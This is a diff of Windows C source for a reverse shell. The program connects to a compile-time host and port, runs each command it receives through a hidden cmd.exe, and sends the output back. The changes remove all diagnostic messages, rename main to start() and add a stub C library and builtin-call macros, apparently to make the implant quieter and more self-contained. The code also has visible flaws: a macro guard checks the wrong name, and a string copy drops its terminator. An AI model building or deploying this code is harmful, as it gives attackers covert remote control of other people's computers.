@@ -1,21 +1,33 @@
 #define WIN32_LEAN_AND_MEAN
+#define _CRT_SECURE_NO_WARNINGS 1
 #include <stdio.h>
 #include <stdlib.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
 
+#include "../stublibc.c"
+
 #ifdef _MSC_VER
 #pragma comment(lib, "ws2_32.lib")
 #endif
 
-static void print_win_error(const char *what, DWORD err) {
-  char *msg = NULL;
-  FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, err,
-                 0, (LPSTR)&msg, 0, NULL);
-  fprintf(stderr, "%s failed (error %lu): %s", what, (unsigned long)err, msg ? msg : "unknown error\n");
-  if (msg)
-    LocalFree(msg);
-}
+#ifndef SHELL_PRE
+#define SHELL "cmd.exe /Q /c"
+#endif
+
+#ifndef SHELL_POST
+#define SHELL_POST ""
+#endif
+
+#ifndef PROMPT
+#define PROMPT ">"
+#endif
+
+#ifdef USE_BUILTINS
+#define CALL(x) __builtin_##x
+#else
+#define CALL(x) x
+#endif
 
 /* Growable byte buffer */
 typedef struct {
@@ -29,13 +41,13 @@ static int buf_append(Buf *b, const char *src, size_t n) {
     size_t newcap = b->cap ? b->cap : 512;
     while (b->len + n + 1 > newcap)
       newcap *= 2;
-    char *tmp = (char *)realloc(b->data, newcap);
+    char *tmp = (char *)CALL(realloc)(b->data, newcap);
     if (!tmp)
       return 0;
     b->data = tmp;
     b->cap = newcap;
   }
-  memcpy(b->data + b->len, src, n);
+  CALL(memcpy)(b->data + b->len, src, n);
   b->len += n;
   b->data[b->len] = '\0';
   return 1;
@@ -49,7 +61,7 @@ static int drain_pipe(HANDLE rd, Buf *out) {
       return 1; /* broken pipe: child closed its end */
     if (avail == 0)
       return 1;
-    char chunk[4096] = {0};
+    char chunk[2048] = {0};
     DWORD got = 0;
     DWORD want = avail < sizeof chunk ? avail : (DWORD)sizeof chunk;
     if (!ReadFile(rd, chunk, want, &got, NULL) || got == 0)
@@ -59,9 +71,16 @@ static int drain_pipe(HANDLE rd, Buf *out) {
   }
 }
 
+static inline char *bi_strdup(const char *src) {
+  int size = CALL(strlen(src));
+  char *dst = CALL(calloc)(size, sizeof(char));
+  CALL(strncpy)(dst, src, size);
+  return dst;
+}
+
 static int run_process(const char *cmdline, const char *input, int merge_err, DWORD timeout_ms, Buf *out,
                        DWORD *exit_code, int *timed_out) {
-  SECURITY_ATTRIBUTES sa;
+  static SECURITY_ATTRIBUTES sa;
   HANDLE out_rd = NULL, out_wr = NULL; /* child's stdout/stderr */
   HANDLE in_rd = NULL, in_wr = NULL;   /* child's stdin         */
   HANDLE err_wr = NULL;                /* child's stderr        */
@@ -70,7 +89,7 @@ static int run_process(const char *cmdline, const char *input, int merge_err, DW
   char *cmd = NULL;
   int ok = 0;
 
-  ZeroMemory(&pi, sizeof pi);
+  SecureZeroMemory(&pi, sizeof pi);
   *timed_out = 0;
   *exit_code = (DWORD)-1;
 
@@ -80,7 +99,6 @@ static int run_process(const char *cmdline, const char *input, int merge_err, DW
 
   /* stdout pipe */
   if (!CreatePipe(&out_rd, &out_wr, &sa, 0)) {
-    print_win_error("CreatePipe(stdout)", GetLastError());
     goto cleanup;
   }
   /* The parent's read end must NOT be inherited by the child. */
@@ -88,7 +106,6 @@ static int run_process(const char *cmdline, const char *input, int merge_err, DW
 
   /* stdin pipe */
   if (!CreatePipe(&in_rd, &in_wr, &sa, 0)) {
-    print_win_error("CreatePipe(stdin)", GetLastError());
     goto cleanup;
   }
   /* The parent's write end must NOT be inherited by the child. */
@@ -101,7 +118,6 @@ static int run_process(const char *cmdline, const char *input, int merge_err, DW
     err_wr = CreateFileA("NUL", GENERIC_WRITE, FILE_SHARE_WRITE, &sa, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (err_wr == INVALID_HANDLE_VALUE) {
       err_wr = NULL;
-      print_win_error("CreateFile(NUL)", GetLastError());
       goto cleanup;
     }
   }
@@ -114,9 +130,8 @@ static int run_process(const char *cmdline, const char *input, int merge_err, DW
   si.hStdError = err_wr;
 
   /* CreateProcess may modify the command-line buffer, so pass a copy. */
-  cmd = _strdup(cmdline);
+  cmd = bi_strdup(cmdline);
   if (!cmd) {
-    fprintf(stderr, "out of memory\n");
     goto cleanup;
   }
 
@@ -127,7 +142,6 @@ static int run_process(const char *cmdline, const char *input, int merge_err, DW
                       CREATE_NO_WINDOW, /* no console window popping up      */
                       NULL, NULL,       /* environment, current directory    */
                       &si, &pi)) {
-    print_win_error("CreateProcess", GetLastError());
     goto cleanup;
   }
 
@@ -157,7 +171,6 @@ static int run_process(const char *cmdline, const char *input, int merge_err, DW
     ULONGLONG start = GetTickCount64();
     for (;;) {
       if (!drain_pipe(out_rd, out)) {
-        fprintf(stderr, "out of memory while reading output\n");
         TerminateProcess(pi.hProcess, 1);
         break;
       }
@@ -209,11 +222,10 @@ static inline int sendQ(SOCKET sock, const char *msg) {
 #define _STR(x) #x
 #define STR(x) _STR(x)
 
-int main(int argc, char *argv[]) {
+int start() {
   WSADATA wsa;
   int rc = WSAStartup(MAKEWORD(2, 2), &wsa);
   if (rc != 0) {
-    fprintf(stderr, "WSAStartup failed: %d\n", rc);
     return 1;
   }
 
@@ -225,7 +237,6 @@ int main(int argc, char *argv[]) {
 
   rc = getaddrinfo(STR(HOST), STR(PORT), &hints, &result);
   if (rc != 0) {
-    fprintf(stderr, "getaddrinfo failed: %d\n", rc);
     WSACleanup();
     return 1;
   }
@@ -236,7 +247,6 @@ int main(int argc, char *argv[]) {
   for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
     sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
     if (sock == INVALID_SOCKET) {
-      fprintf(stderr, "socket failed: %d\n", WSAGetLastError());
       continue;
     }
     if (connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR) {
@@ -250,43 +260,40 @@ int main(int argc, char *argv[]) {
   freeaddrinfo(result);
 
   if (sock == INVALID_SOCKET) {
-    fprintf(stderr, "Unable to connect to %s:%s\n", argv[1], argv[2]);
     WSACleanup();
     return 1;
   }
 
   int running = 1, n = 0, timed_out = 0;
-  char buf[10240] = {0}, null_buf[sizeof(buf)] = {0}, cmd[20 + sizeof(buf)] = {0}, path[1024] = {0},
-       prompt[sizeof(path) + 2] = {0};
-  const char *tmp = "cmd.exe /Q /c %s", *prompt_ = "%s>";
-  Buf out = {0};
+  char buf[1024], cmd[20 + sizeof(buf)], path[1024];
+  SecureZeroMemory(buf, sizeof(buf));
+  SecureZeroMemory(path, sizeof(path));
+  Buf out;
+  SecureZeroMemory(&out, sizeof(out));
   DWORD code = 0;
   while (running) {
     if (n == 0) {
       GetCurrentDirectoryA(sizeof(path), path);
-      snprintf(prompt, sizeof(prompt), prompt_, path);
-      sendQ(sock, prompt);
+      sendQ(sock, path);
+      sendQ(sock, PROMPT);
     }
     n += recv(sock, buf + n, sizeof(buf) - 1 - n, 0);
     if (n == 0) {
-      printf("Connection closed by server\n");
       running = 0;
       break;
     } else if (n < 0) {
-      fprintf(stderr, "recv failed: %d\n", WSAGetLastError());
       running = 0;
       break;
     }
     buf[n] = '\0';
     if (buf[n - 1] != '\n')
       continue;
-    if (strncmp(buf, "quit", 4) == 0 || strncmp(buf, "exit", 4) == 0) {
+    if (CALL(strncmp)(buf, "quit", 4) == 0 || CALL(strncmp)(buf, "exit", 4) == 0) {
       running = 0;
       break;
     }
-    if (strncmp(buf, "cd ", 3) == 0) {
+    if (CALL(strncmp)(buf, "cd ", 3) == 0) {
       buf[n - 1] = '\0';
-      printf("Changing path to %s\n", buf + 3);
       if (!SetCurrentDirectoryA(buf + 3)) {
         char *msg = NULL;
         FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
@@ -295,15 +302,19 @@ int main(int argc, char *argv[]) {
         if (msg)
           LocalFree(msg);
       }
-      memcpy(buf, null_buf, n);
+      SecureZeroMemory(buf, sizeof(buf));
       n = 0;
       continue;
     }
     if (n == 1) {
-      memcpy(buf, null_buf, n);
+      SecureZeroMemory(buf, sizeof(buf));
       n = 0;
     }
-    snprintf(cmd, sizeof(cmd), tmp, buf);
+    // CALL(snprintf)(cmd, sizeof(cmd), SHELL, buf);
+    CALL(strncpy)(cmd, SHELL " ", sizeof(cmd));
+    CALL(strncat)(cmd, buf, sizeof(cmd) - CALL(strlen)(cmd) - 1);
+    CALL(strncat)(cmd, " " SHELL_POST, sizeof(cmd) - CALL(strlen)(cmd) - 1);
+    cmd[sizeof(cmd) - 1] = '\0';
     if (run_process(cmd, buf, 1, 10000, &out, &code, &timed_out)) {
       if (timed_out)
         sendQ(sock, "Process timed out\n");
@@ -313,7 +324,7 @@ int main(int argc, char *argv[]) {
       }
       send(sock, out.data, out.len, 0);
       sendQ(sock, "\n");
-      memcpy(buf, null_buf, n);
+      SecureZeroMemory(buf, sizeof(buf));
       n = 0;
     } else
       sendQ(sock, "Could not start the process.\n\n");
@@ -321,7 +332,7 @@ int main(int argc, char *argv[]) {
 
   shutdown(sock, SD_BOTH);
   closesocket(sock);
-  free(out.data);
+  CALL(free)(out.data);
   return 0;
 }
 
